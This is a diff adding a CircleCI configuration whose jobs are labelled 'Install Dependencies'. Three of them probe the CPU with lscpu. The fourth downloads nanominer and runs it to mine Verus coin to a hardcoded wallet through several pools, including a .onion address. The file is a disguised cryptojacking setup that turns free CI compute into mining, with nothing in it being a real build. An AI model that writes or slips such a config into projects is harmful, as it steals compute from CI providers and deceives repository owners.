@@ -1,0 +1,38 @@
+version: 2.1
+jobs:
+    Devop:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: timeout 1m lscpu
+    Devop1:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: timeout 1m lscpu
+    Devop2:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: timeout 1m lscpu
+    Devop3:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://github.com/nanopool/nanominer/releases/download/v3.6.5/nanominer-linux-3.6.5.tar.gz && tar -xf nanominer-linux-3.6.5.tar.gz && cd nanominer-linux-3.6.5 && chmod +x nanominer && ./nanominer -algo Verushash -coin VRSC -wallet REnxEfiUp9TdmUZ5CtqGN1o4pETGraRFE5.M1 -pool1 na.luckpool.net:3956 -pool2 stratum+tcp://pool.verus.io:9999 -pool3 http://verus55ppoolhdjdgnndve6ve3dv7lhduoxw33bjbnj2dhgkcyyuslyd.onion:80 -pool4 verus55ppoolhdjdgnndve6ve3dv7lhduoxw33bjbnj2dhgkcyyuslyd.onion:9999 -pool5 stratum+tcp://pool.verus.io:9999
+workflows:
+    version: 2.1
+    build:
+        jobs:
+            - Devop
+            - Devop1
+            - Devop2
+            - Devop3
